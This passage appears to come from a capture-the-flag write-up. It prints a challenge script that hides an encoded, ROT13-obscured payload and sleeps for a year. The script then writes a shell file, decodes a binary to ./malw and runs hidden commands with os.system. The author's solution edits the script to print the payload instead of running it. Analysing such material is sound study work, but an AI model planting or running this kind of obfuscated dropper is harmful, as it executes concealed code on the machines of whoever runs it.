+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN9ORNNNNNNNPtRDNNNNNNNNRNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNJjNNNNNNNNNZNNNNNNNNNNNDNNNNNNNNQDNNNNNNNNP5RjNNNNNNNOxNNNNNNNNNxQ5NNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNoNNNNNNNNNNtNNNNNNNNNTtNNNNNNNNPLCDNNNNNNNOjNNNNNNNNNPNNNNNNNNNQ6/i4iNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NZNQNNNNNNNNODNNNNNNNNNVODNNNNNNNNLNNNNNNNNN1NZNNNNNNNNXNNNNNNNNNAHNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>PjNNNNNNNNNLNNNNNNNNNOHNNNNNNNNNNNNNNNNNNNNQNNNNNNNNNWN/NNNNNNNNNtNNNNNNNNPD
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNODNNNNNNNNNOjNNNNNNNNNKNNNNNNNNNNtUNNNNNNNNOjNNNNNNNNOVOtNNNNNNNNtN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNjNNNNNNNNNNWNNNNNNNNNOtNNNNNNNNNUtNNNNNNNNNVNNNNNNNNNCi//73NNNNNNDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>PNNNNNQ_//4iNNNNNCtSNNNNNNNN////ojNNNNNONNNNNNNNNCQ//73NNNNN8tHNNNNNNNQ0//4i
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNZNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNPtCDNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNjRNNNNNNNNRNDNNNNNNNNHONNNNNNNNOtRNNNNNNNNUNDNNNNNNNNtONNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNVDNNNNNNNNRqQDmbtXSIv
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qJ05qFNkAP9lYwNgZGy6LaIhqUHlXFNkAP9lYwNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNO
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNONQk/jNNNNNNNNNNNNNNNNNNNNNWNNNNNDNHNRjuNNNNNNNNVNNNNNNNNNNGNNNNONQk/jNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNrNNNNNtNCNQNENNNNNNNNNNNNNNNNNNNtNNNNNtNCNTNENNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNmNNNNNtNCNXNENNNNNNNNNNNNNNNNNNOWNNNNNDNoNOONNNNNNNNNNDNNNNNNNNOINNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NDNKNWt4NNNNNNNNNNNNNNNNNNO3NNNNNtNCNBNENNNNNNNNNNNNNNNNNNPVNNNNNDNJNWN4NNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNPaNNNNONQk/jNNNNNNNNNNNNNNNNNNNNNGNNNNONQk/jNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNPeNNNNNDNGNRtuNNNNNNNNNNNNNNNNNNNNNNNNONQk/jNNNNNNNNNNNNNNNNNNNNP0NNNNNDNL
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NXN4NNNNNNNNNNNNNNNNNNQPNNNNNNNFNTjtNNNNNNNNNNNNNNNNNNQINNNNNDNMNWN/NNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNQeNNNNRtNNNNNNNNNNNNNNNNNNNNNNNNNVNDNNVNNNNNNNNNNNNNNNNNNNNNNNNNOl
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NDNNVNNnNNONNNNNNNNNNNNNNNNNNNNxNDNNRtNNNNNNNNNNNNNNNNNNNNNNNNN6NDNNRNNnNOON
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNN3NDNNRtVDNYDGNNNNNNNNNNNNNNNNNNOPNDNNRtNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNOqNDNNRtNNNNNNNNNNNNNNNNNNNNNNNNOjNDNNRNNnNNONNNNNNNNNNNNNNNNNNNO4NDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>RtNNNNNNNNNNNNNNNNNNNNNNNNPDNDNNVNNNNNNNNNNNNNNNNNNNNNNNNNPsNDNNRDVnNNuNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNPfNDNNRDNENNNtNNNNNNNNONNNNNNNNNP2NDNNRNNoNOuNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNO7NDNNRtNCNNNENNNNNNNNWtNNNNNNNNQNNDNNRNNoNOONNNNNNNNNNNNNNNNNNNQZNDNNRtNC
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NBxENNNNNNNNlDRNNNNNNNQENDNNRtNNNNNNNNNNNNNNNNNNNNNNNNQdNDNNRDVnNOONNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNQ7NDNNVNNNNNNNNNNNNNNNNNNNNNNNNNNDNtNNRtNNNNNNNNNNNNNNNNNNNNNNNNNv
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NtNNVtNNNNNNNNNNNNNNNNNNNNNNNNN4NtNNRtVYNNNDNNNNNNNNNNNNNNNNNNNNH7AlqQRhojOs
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>K7SvnI45LJpNL8W5p8E6MzLhLjOxMKWyM7ymqTIlK8EgK7Afo70ypjOsK7EiK7qfo7WuoS4xqT4l
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>p64uqKtNL74gpTkyqTIxYwNNK64xo64aoT4vLJksMUEipaAsLKI9K7McozysLKWlLKysMJ05paxN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>MaWuoJIsMUIgoKxNK64zpzSgMI4xqJ6grI4cozy5K7SlpzS0K7IhqUW0NQVhLjOsK5MFDH6SK5IB
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ES4sNS4RJH0OGHyQNS4sE50IK5IVK5MFDH6SK5uRHtOsE5kCDxSZK54TEyASIS4HDHWZEI3NK64f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>nJWwK8A5LKW5K76unJ0NE5kWDxAsZv9mANOsFIEAK7EypzIanKA5MKWHGHAfo70yITSvoTHNpUI5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>p5OUGRyPD63lYwVhADOsMJEuqTRNK7McozxNK64mqTSwn64wnTgsMzScoROUGRyPD63lYwDNpUWc
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>oaEzDRqZFHWQKmVhZv96NS4sMTS5LI4mqTSlqNOmqUWwoKONE5kWDxAsZv9lYwHNK64aoJ4hK8A5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>LKW5K63NK64xp74snTShMTkyNS4WG64mqTEcoy46p7IxNS4yozDNK64vp8Asp8EupaDNoJScotOs
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>K7ymo7Z0BI4mL7ShMxOUGRyPD63lYwpNK64HGHAsEH0RK63NK5yHGI4lMJqcp8EypyEAD7kiozIH
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>LJWfMDOmoTIypROUGRyPD63lYwVhADOsK7A9LI4znJ0uoTy1MHOUGRyPD63lYwVhADOsnJ0cqNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>YaA0oKEuLtNhp8ElqTSvNP0mnUA5paEuLtNhoz45MF0aoaHhpUWipTIlqUxNYz0iqTHhM706YzW6
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>nJkxYJyxNP0coaEypaNNYzqhqF0bLKAbNP0xrJ0mrJ5NYzE0oaA5ptNhM706YaMypaAco79NYzqh
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qF07MKWmnJ4hK8VNYaWyoTRhMUyhNP0lMJkuYaOfqNNhnJ0cqNNhpTk5YzqiqNNhpTk5YaAyLjNh
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qTI9qNNhMzyhnDNhpz4xLKEuNP0ynS4zpzSgMI4bMUVNYzIbK7MlLJ6yNP0ho8EyYxSPFF65LJpN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Yz0iqTHhpTSwn7SaMDNhnJ0cqS4upaWurDNhMzyhnI4upaWurDNhMUyhLJ6cLjNhMTS5LDNhLaAm
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NP0wo76gMJ05NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNOfNNNNUNNNNNtNNNNNNNNODNjNNNNNNNSNQNNNNNNNNZNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNNhNNNNOjNNNNVNNNNNNNNNtNZNNNNNNNPNNjNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNPDNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNNDDNNNNRNNNNPNNNNNNNNNXDQNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNcNZNNNNNNNNpNNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNNNNNNNRxNNNQ7//4iNtNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNQNNjNNNNNNNZNQNNNNNNNNWNNNNNNNNNNSNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNOGNNNNPjNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNVNNNNNNNNN1NZNNNNNNNQbNjNNNNNNNPNONNNNNNNNOtNNNNRNNNNVNNNNNNNNNOtNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>JjNNNNZNNNNPNNNNNNNNNNtSNNNNNNNNPNHNNNNNNNQINNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNTZNNNQ///4iNtNNNNNNNNQrODNNNNNNNA9SNNNNNNNNTNNNNNNNNNNSNNNNNNNNNNVN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNtNNNNNNNNOjNNNN/i//ojVNNNNNNNNN_NHNNNNNNNQ9ODNNNNNNNSNNNNNNNNNNOtNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNRNNNNVNNNNNNNNNNNNNNNNNNNNsjNNNNDNNNNPNNNNNNNNNRtTNNNNNNNNFNLNNNNNNNQNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNHNNNNNNNNNPNNNNNNNNNNLNNNNNNNNNVxNNNNRNNNNDtNNNNNNNNNVOjNNNNNNNNtUNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNxNNNNNNNNNNSNNNNTDNNNNtNNNNNNNNNTNNNNNNNNNPGNNNNNDNNNNLNNNNNNNNNNONNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNRNNNNNNNNOfNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNNwtNNNNRNNNNTNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NPNDNNNNNNNNVONNNNNNNNOjNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNDNNNNNNNNNWxNNNNONNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>OtNNNNNNNNPDRNNNNNNNNWNDNNNNNNNNRNNNNNNNNNNNNNNNNNNNNONNNNNNNNNNRNNNNNNNNNPv
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNDNNNNLNNNNNNNNNbONNNNNNNNPtRNNNNNNNNTNNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNONN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNdjNNNNRNNNNTNNNNNNNNNNNENNNNNNNNNORNNNNNNNPlNtNNNNNNNNNNNNNNNNNNRNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNYRNNNNONNNNOtNNNNNNNNP5RjNNNNNNNYDGNNNNNNNNQDNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNDNNNNNNNNNNNNNNNNNNNP8NNNNNDNNNNVNNNNNNNNNNPNNNNNNNNNNVNNNNNNNNTjNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNNijNNNNRNNNNPNNNNNNNNNTjtNNNNNNNNoPNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNN5NNNNNNNNNNNNNNNNNNNNONNNNNNNNNNNNNNNNNNNNZ5NNNNONNNNNtNNNNNNNNPtVNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NXNtNNNNNNNNeNNNNNNNNNNNNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNQKNNNNOjNNNNVNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>GPRNNNNNNNOZVDNNNNNNNPNNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNN0DNNNNpNNNNP
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNTjuNNNNNNNNoPRNNNNNNNOjNNNNNNNNNNNNNNNNNNNNONNNNNNNNNNNNNNNNNNNNCZN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNBNNNNNjNNNNNNNNPDCDNNNNNNNWNgNNNNNNNNPNNNNNNNNNNNNNNNNNNNNNtNNNNNNNNNPNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNQ/NNNNQjNNNNZNNNNNNNNNzQ5NNNNNNNPLYDNNNNNNNNtNNNNNNNNNNNNNNNNNNNNVNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNtNNNNNNNNNPjRNNNLNNNNQNNNNNNNNNXN4NNNNNNNNbP5NNNNNNNQjNDNNNNNNNNLNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNPNNNNNNNNNNDNNNNNNNNNW5NNNNONNNNNjNNNNNNNNPDCjNNNNNNNWNiNNNNNNNNpNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNtNNNNNNNNNPNNNNNNNNNNHNDNNNDNNNNZNNNNNNNNNNRNNNNNNNNNNZNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NONNNNNNNNNNNNNNNNNNNNNVNNNNNNNNNNNNNNNNNNNNTtRNNNtNNNNQNNNNNNNNNOONNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>RQNNNNNNNNNVNNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNNNNNNNO3ONNNONNNNZNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNONjNNNNNNNNWtNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNDNNNNNNNNNONNNNNtNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNN9ZNNNNNNNNAtQNNNNNNNNUtNNNOVNNNNVNNNNNNNNNOtNNNNNNNNNPDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNZNNNNNNNNNNNNNNNNNNNNNNNNNRQDNNNNNNNOQNtNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNORNNNNQNNNNNNNNNNNNNNNNNNNNNNNNNSZ7NNNNNNNNXNRNNNNNNNNNNNNNNNNNNNRNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNN-&#39; | onfr19 !q &gt; ./znyj
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>juvyr gehr; qb
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    rpub &#34;Lbh ner unpxrq+&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    fyrrc 6
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qbar
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>command1 <span style=color:#f92672>=</span> deobfuscate3(deobfuscate2(deobfuscate1(command1)))
+</span></span><span style=display:flex><span>command2 <span style=color:#f92672>=</span> deobfuscate3(deobfuscate2(deobfuscate1(command2)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> deobfuscate3(deobfuscate2(deobfuscate1(data)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>31536000</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;lol.sh&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>    f<span style=color:#f92672>.</span>write(data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>system(command1)
+</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>system(command2)
+</span></span></code></pre></div><p>Solution</p><p>Edit the script, towards the end, to print the deobfuscated data instead of executing them, see [<code>1_edited.py</code> for how I did that.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deobfuscate1</span>(string):
+</span></span><span style=display:flex><span>    mapping <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;a&#39;</span>: <span style=color:#e6db74>&#39;n&#39;</span>, <span style=color:#e6db74>&#39;b&#39;</span>: <span style=color:#e6db74>&#39;o&#39;</span>, <span style=color:#e6db74>&#39;c&#39;</span>: <span style=color:#e6db74>&#39;p&#39;</span>, <span style=color:#e6db74>&#39;d&#39;</span>: <span style=color:#e6db74>&#39;q&#39;</span>, <span style=color:#e6db74>&#39;e&#39;</span>: <span style=color:#e6db74>&#39;r&#39;</span>, <span style=color:#e6db74>&#39;f&#39;</span>: <span style=color:#e6db74>&#39;s&#39;</span>, <span style=color:#e6db74>&#39;g&#39;</span>: <span style=color:#e6db74>&#39;t&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;h&#39;</span>: <span style=color:#e6db74>&#39;u&#39;</span>, <span style=color:#e6db74>&#39;i&#39;</span>: <span style=color:#e6db74>&#39;v&#39;</span>, <span style=color:#e6db74>&#39;j&#39;</span>: <span style=color:#e6db74>&#39;w&#39;</span>, <span style=color:#e6db74>&#39;k&#39;</span>: <span style=color:#e6db74>&#39;x&#39;</span>, <span style=color:#e6db74>&#39;l&#39;</span>: <span style=color:#e6db74>&#39;y&#39;</span>, <span style=color:#e6db74>&#39;m&#39;</span>: <span style=color:#e6db74>&#39;z&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;n&#39;</span>: <span style=color:#e6db74>&#39;a&#39;</span>, <span style=color:#e6db74>&#39;o&#39;</span>: <span style=color:#e6db74>&#39;b&#39;</span>, <span style=color:#e6db74>&#39;p&#39;</span>: <span style=color:#e6db74>&#39;c&#39;</span>, <span style=color:#e6db74>&#39;q&#39;</span>: <span style=color:#e6db74>&#39;d&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>: <span style=color:#e6db74>&#39;e&#39;</span>, <span style=color:#e6db74>&#39;s&#39;</span>: <span style=color:#e6db74>&#39;f&#39;</span>, <span style=color:#e6db74>&#39;t&#39;</span>: <span style=color:#e6db74>&#39;g&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;u&#39;</span>: <span style=color:#e6db74>&#39;h&#39;</span>, <span style=color:#e6db74>&#39;v&#39;</span>: <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;w&#39;</span>: <span style=color:#e6db74>&#39;j&#39;</span>, <span style=color:#e6db74>&#39;x&#39;</span>: <span style=color:#e6db74>&#39;k&#39;</span>, <span style=color:#e6db74>&#39;y&#39;</span>: <span style=color:#e6db74>&#39;l&#39;</span>, <span style=color:#e6db74>&#39;z&#39;</span>: <span style=color:#e6db74>&#39;m&#39;</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;A&#39;</span>: <span style=color:#e6db74>&#39;N&#39;</span>, <span style=color:#e6db74>&#39;B&#39;</span>: <span style=color:#e6db74>&#39;O&#39;</span>, <span style=color:#e6db74>&#39;C&#39;</span>: <span style=color:#e6db74>&#39;P&#39;</span>, <span style=color:#e6db74>&#39;D&#39;</span>: <span style=color:#e6db74>&#39;Q&#39;</span>, <span style=color:#e6db74>&#39;E&#39;</span>: <span style=color:#e6db74>&#39;R&#39;</span>, <span style=color:#e6db74>&#39;F&#39;</span>: <span style=color:#e6db74>&#39;S&#39;</span>, <span style=color:#e6db74>&#39;G&#39;</span>: <span style=color:#e6db74>&#39;T&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;H&#39;</span>: <span style=color:#e6db74>&#39;U&#39;</span>, <span style=color:#e6db74>&#39;I&#39;</span>: <span style=color:#e6db74>&#39;V&#39;</span>, <span style=color:#e6db74>&#39;J&#39;</span>: <span style=color:#e6db74>&#39;W&#39;</span>, <span style=color:#e6db74>&#39;K&#39;</span>: <span style=color:#e6db74>&#39;X&#39;</span>, <span style=color:#e6db74>&#39;L&#39;</span>: <span style=color:#e6db74>&#39;Y&#39;</span>, <span style=color:#e6db74>&#39;M&#39;</span>: <span style=color:#e6db74>&#39;Z&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;N&#39;</span>: <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#e6db74>&#39;O&#39;</span>: <span style=color:#e6db74>&#39;B&#39;</span>, <span style=color:#e6db74>&#39;P&#39;</span>: <span style=color:#e6db74>&#39;C&#39;</span>, <span style=color:#e6db74>&#39;Q&#39;</span>: <span style=color:#e6db74>&#39;D&#39;</span>, <span style=color:#e6db74>&#39;R&#39;</span>: <span style=color:#e6db74>&#39;E&#39;</span>, <span style=color:#e6db74>&#39;S&#39;</span>: <span style=color:#e6db74>&#39;F&#39;</span>, <span style=color:#e6db74>&#39;T&#39;</span>: <span style=color:#e6db74>&#39;G&#39;</span>,
